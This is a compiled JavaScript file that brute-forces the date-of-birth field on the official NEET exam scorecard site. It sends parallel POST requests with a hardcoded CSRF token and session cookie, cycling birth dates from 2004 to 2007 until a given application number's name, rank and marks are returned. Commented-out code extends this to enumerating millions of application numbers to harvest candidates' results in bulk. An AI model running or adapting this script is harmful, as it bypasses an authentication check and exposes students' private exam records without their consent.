"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
const qs_1 = __importDefault(require("qs"));
const cheerio_1 = __importDefault(require("cheerio"));
function parseHtml(htmlContent) {
    const $ = cheerio_1.default.load(htmlContent);
    const applicationNumber = $('td:contains("Application No.")').next("td").text().trim() || "N/A";
    const candidateName = $('td:contains("Candidate’s Name")').next("td").text().trim() || "N/A";
    const allIndiaRank = $('td:contains("NEET All India Rank")').next("td").text().trim() || "N/A";
    const marks = $('td:contains("Total Marks Obtained (out of 720)")').first().next("td").text().trim() || "N/A";
    if (allIndiaRank == "N/A") {
        return null;
    }
    return {
        applicationNumber,
        candidateName,
        allIndiaRank,
        marks
    };
}
function solve(applicationNumber, day, month, year) {
    return __awaiter(this, void 0, void 0, function* () {
        let data = qs_1.default.stringify({
            '_csrf-frontend': 'J78qmesMeW8lUo5MQLJ5r9AONgpX7jqwLB25EKIndMx-jWPO2WEKXEY60QM0wAyXkmRnZ2XZaf5DX_5Dyl8tgw==',
            'Scorecardmodel[ApplicationNumber]': applicationNumber,
            'Scorecardmodel[Day]': day,
            'Scorecardmodel[Month]': month,
            'Scorecardmodel[Year]': year
        });
        let config = {
            method: 'post',
            maxBodyLength: Infinity,
            url: 'https://neet.ntaonline.in/frontend/web/scorecard/index',
            headers: {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'advanced-frontend=hplat7q2pgep3gtm0tvcb9qk4k; _csrf-frontend=3244112f97eb98ebdc8ce17228b3af9baf70bba3362b0a20df1d2db17d498f0fa%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22Y2IW2ms3ch_Otru8BjQm27SNoBGShxYO%22%3B%7D',
                'DNT': '1',
                'Origin': 'null',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Chromium";v="125", "Not.A/Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"'
            },
            data: data
        };
        try {
            const response = yield axios_1.default.request(config);
            const parsedData = parseHtml(JSON.stringify(response.data));
            return parsedData;
        }
        catch (e) {
            return null;
        }
        // if(parsedData) {
        //     console.log(parsedData.marks);
        //     console.log(parsedData.allIndiaRank)
        // }
    });
}
function main(rollNumber) {
    return __awaiter(this, void 0, void 0, function* () {
        let solved = false;
        for (let year = 2007; year >= 2004; year--) {
            if (solved) {
                break;
            }
            for (let month = 1; month <= 12; month++) {
                if (solved) {
                    break;
                }
                const dataPromises = [];
                for (let day = 1; day <= 31; day++) {
                    console.log(`processing ${rollNumber} for ${day}--${month}--${year}`);
                    const dataPromise = solve(rollNumber, day.toString(), month.toString(), year.toString());
                    dataPromises.push(dataPromise);
                }
                const resolvedData = yield Promise.all(dataPromises);
                resolvedData.forEach(data => {
                    if (data) {
                        console.log(data);
                        solved = true;
                    }
                });
                //wait for 31 requests 
            }
        }
    });
}
// async function my(rollNumber: string) {
//     // let solved = false
//     // const dataPromises = []
//         console.log(`processing ${rollNumber} for 01 --12--2005`);
//         const dataPromise = await solve(rollNumber, "01", "12", "2005");
//         if (dataPromise) {
//             console.log(dataPromise);
//         }
//         // dataPromises.push(dataPromise)
//     }
//     // const resolvedData = await Promise.all(dataPromises)  
//     //         resolvedData.forEach(data => {
//     //             if (data) {
//     //                 console.log(data);
//     //                 solved = true
//     //             }
//     //         });
// //  }
// // my("240411174461");
// async function solveAllApplications() {
//     const BATCH_SIZE = 50;
//     // const dataPromises = []
//     // const args = [];
//     for (let i = 24040002400; i < 24042600000; i++) {
//         // args.push(i.toString());
//         console.log(`processing ${i} for 01 --12--2005`);
//         const dataPromise = await solve(i.toString(), "01", "12", "2005")//10,00,000
//         // dataPromises.push(dataPromise)
//         if(dataPromise) {
//             console.log(dataPromise);
//         }
//     }
//     // for (let i = 0; i < args.length; i += BATCH_SIZE) {
//     //     const batch = args.slice(i, i + BATCH_SIZE);
//     //     const startTime = Date.now();
//     //     await Promise.all(batch.map(async (arg) => {
//     //         const res = await solve(arg, "01", "12", "2005");
//     //         if (res) {
//     //             console.log(`Rank found for ${arg} in ${Date.now() - startTime}ms`);
//     //             console.log(res);
//     //         }
//     //     }
//     //     ));
//     // }
//     // const resodat = await Promise.all(dataPromises)
//     // resodat.forEach(data => {
//     //     if (data) {
//     //         console.log(data);
//     //     }
//     // });
// }
// solveAllApplications();
function solveAllApplications() {
    return __awaiter(this, void 0, void 0, function* () {
    });
}
main("240411183517");
// solve("240411183516", "08", "03", "2007");
